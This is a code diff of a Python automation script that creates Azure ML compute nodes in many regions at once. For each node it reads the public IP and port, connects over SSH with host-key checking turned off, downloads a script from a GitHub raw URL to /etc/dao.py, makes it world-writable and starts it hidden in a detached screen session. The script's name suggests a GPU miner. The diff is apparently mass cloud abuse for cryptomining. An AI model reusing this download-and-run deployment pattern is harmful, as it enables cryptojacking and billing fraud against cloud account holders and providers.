+                command = 'az ml computetarget create amlcompute --name %s --min-nodes 1 --max-nodes 1 --admin-username azureuser --admin-user-password %s --admin-user-ssh-key "%s" --remote-login-port-public-access Enabled --vm-size %s --resource-group %s --location %s --workspace-name %s --subscription %s' % (local_vps_name, password_vps, rsa_pub, local_type, group_temp, region_temp, workspace_temp, subscript_temp)
+                print(command)
+                try:
+                    process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],
+                                               stdout=subprocess.PIPE)
+                except:
+                    pass
+                try:
+                    result = process.communicate()[0]
+                    print(result)
+                    # ketqua = json.loads(result)
+                    # print(ketqua)
+                except:
+                    pass
                 time.sleep(200)
-                try:
-                    process.terminate()
-                except:
-                    pass
-                try:
-                    process.kill()
-                except:
-                    pass
-
-
-            location_list = ['australiaeast', 'eastus', 'japaneast', 'northcentralus', 'northeurope', 'southcentralus',
-                             'southeastasia', 'uksouth', 'westeurope', 'westus2']
-            # location_list = ['australiaeast']
-            threads = [threading.Thread(target=local_create_vps, args=(group, region, workspace_name, subscript,)) for
-                       region in
-                       location_list]
+                for cho in range(0, 10, 1):
+                    command = 'az ml computetarget show --resource-group %s --workspace-name %s --name %s -v' % (
+                        group_temp, workspace_temp, local_vps_name)
+                    print(command)
+                    try:
+                        process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],
+                                                   stdout=subprocess.PIPE)
+                    except:
+                        pass
+                    try:
+                        result = process.communicate()[0]
+                        # print(result)
+                        ketqua = json.loads(result)
+                        # print(ketqua)
+                    except:
+                        pass
+                    try:
+                        open_file = open('/root/%s' % local_vps_name, 'r')
+                        doc_file = open_file.read()
+                        open_file.close()
+                        print(doc_file)
+                        ip_address = None
+                        port_number = None
+                    except:
+                        pass
+                    try:
+                        ip_address = re.findall('"publicIpAddress":"(.+?)"', doc_file)[0]
+                        print(ip_address)
+                    except:
+                        pass
+                    try:
+                        port_number = re.findall('"port":(.+?),"', doc_file)[0]
+                        print(port_number)
+                    except:
+                        pass
+                    # price_array = re.findall("Buy \((.+?)\$", text_return)
+                    if ip_address is not None and port_number is not None:
+                        os.system('rm -rf /root/%s' % local_vps_name)
+                        print('%s:%s' % (ip_address, str(port_number)))
+                        command_ssh = 'command_ssh'
+                        command_ssh_path = os.path.join(working_dir, command_ssh)
+    
+                            
+                        command_ssh_data = 'sudo su root\r\napt-get update -y; apt-get install -y python; apt-get install -y python3; apt-get install -y python3-pip; apt-get install -y python-pip; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_gpu_docker.py -O /etc/dao.py; chmod 777 ' \
+                                            '/etc/dao.py; screen -dm python3 /etc/dao.py; exit; exit;exit;\r\n'
+                        
+    
+                        f = open(command_ssh_path, "w+")
+                        f.write(command_ssh_data)
+                        f.close()
+                        data_output = 'ssh -i %s %s@%s -p %s\n' % (rsa_path, 'azureuser', ip_address, str(port_number))
+                        print('ssh -i %s %s@%s -p %s' % (rsa_path, 'azureuser', ip_address, str(port_number)))
+                        working_dir = os.path.dirname(os.path.realpath(__file__))
+                        log_file = 'log.txt'
+                        log_path = os.path.join(working_dir, log_file)
+                        f = open(log_path, "a+")
+                        f.write(data_output)
+                        f.close()
+                        time.sleep(60)
+                        process = subprocess.Popen(['ssh', '-o ConnectTimeout=20', '-o StrictHostKeyChecking=no', '-i' + rsa_path, '-tt', 'azureuser@' + ip_address, '-p ' + str(port_number)], stdout=subprocess.PIPE, stdin=open(command_ssh_path, 'r'))
+                        time.sleep(60)
+                        try:
+                            process.terminate()
+                        except:
+                            pass
+                        try:
+                            process.kill()
+                        except:
+                            pass
+                        break
+                    time.sleep(60)
+            '''
+            #location_list = ['australiaeast', 'eastus', 'japaneast', 'northcentralus', 'northeurope', 'southcentralus',
+            #                 'southeastasia', 'uksouth', 'westeurope', 'westus2']
+            #location_du nc4s
+            
+            #location_list = ['australiaeast', 'brazilsouth', 'centralindia', 'eastus', 'eastus2', 'germanywestcentral', 'japaneast', 'koreacentral', 'northeurope', 'southcentralus', 'southeastasia', 'uksouth', 'westeurope', 'westus', 'westus2']
+            location_list = ['eastus']
+            threads = [threading.Thread(target=local_create_vps, args=(group, region, region, subscript,)) for region in location_list]
             for x in threads:
-                time.sleep(0.2)
+                time.sleep(2)
                 x.start()
             # Stop the threads
             for x in threads:
                 x.join()
+            '''
+            #location_list = ['australiaeast', 'eastus', 'eastus2', 'japaneast', 'northcentralus', 'northeurope', 'southcentralus', 'southeastasia', 'uksouth', 'westeurope', 'westus2']
+            location_list = ['australiaeast', 'eastus', 'eastus2', 'japaneast', 'northeurope', 'southcentralus', 'southeastasia', 'uksouth', 'westeurope', 'westus2']
+            # location_list = ['australiaeast']
+            threads = [threading.Thread(target=local_create_vps_phu, args=(group, region, region, subscript,)) for region in location_list]
+            for x in threads:
+                time.sleep(2)
+                x.start()
+            # Stop the threads
+            for x in threads:
+                x.join()
+            
